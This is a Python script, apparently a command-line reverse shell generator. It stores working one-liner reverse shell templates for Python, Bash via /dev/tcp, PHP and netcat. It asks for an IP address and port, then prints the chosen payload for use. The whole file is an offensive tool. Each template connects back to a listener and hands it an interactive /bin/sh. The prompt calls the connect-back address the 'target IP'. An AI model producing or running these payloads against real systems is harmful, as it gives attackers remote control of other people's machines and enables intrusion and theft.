import sys

# Dictionary containing reverse shell payload templates for various languages.
PAYLOADS = {
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        "import pty; pty.spawn(\"/bin/sh\")'"
    ),
    "bash": (
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "netcat": (
        "nc -e /bin/sh {ip} {port}"
    ),
}


def get_user_input(prompt, valid_options=None):
    # Prompt user for input, optionally validating against allowed options.
    while True:
        value = input(prompt).strip()
        if valid_options:
            if value.lower() in valid_options:
                return value.lower()
            else:
                print(f"Invalid input. Choose from: {', '.join(valid_options)}")
        else:
            if value:
                return value
            else:
                print("Input cannot be empty.")


def validate_ip(ip):
    # Basic IPv4 validation.
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False


def validate_port(port_str):
    # Check if the port is an integer between 1 and 65535.
    try:
        port = int(port_str)
        return 1 <= port <= 65535
    except ValueError:
        return False


def generate_payload(ip, port, language):
    # Generate the reverse shell payload string with the given parameters.
    template = PAYLOADS.get(language)
    if not template:
        raise ValueError(f"Unsupported payload language: {language}")
    return template.format(ip=ip, port=port)


def main():
    print("Reverse Shell Generator Tool\n")

    ip = get_user_input("Enter target IP address: ")
    while not validate_ip(ip):
        print("Invalid IP address format.")
        ip = get_user_input("Enter target IP address: ")

    port = get_user_input("Enter listening port: ")
    while not validate_port(port):
        print("Invalid port. Must be between 1 and 65535.")
        port = get_user_input("Enter listening port: ")

    languages = list(PAYLOADS.keys())
    print("\nSelect payload language:")
    for idx, lang in enumerate(languages, start=1):
        print(f"{idx}. {lang.capitalize()}")

    choice = get_user_input("Enter choice number: ", [str(i) for i in range(1, len(languages) + 1)])
    selected_lang = languages[int(choice) - 1]

    payload = generate_payload(ip, port, selected_lang)
    print("\nGenerated Reverse Shell Payload:\n")
    print(payload)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nUser interrupted. Exiting.")
        sys.exit(0)
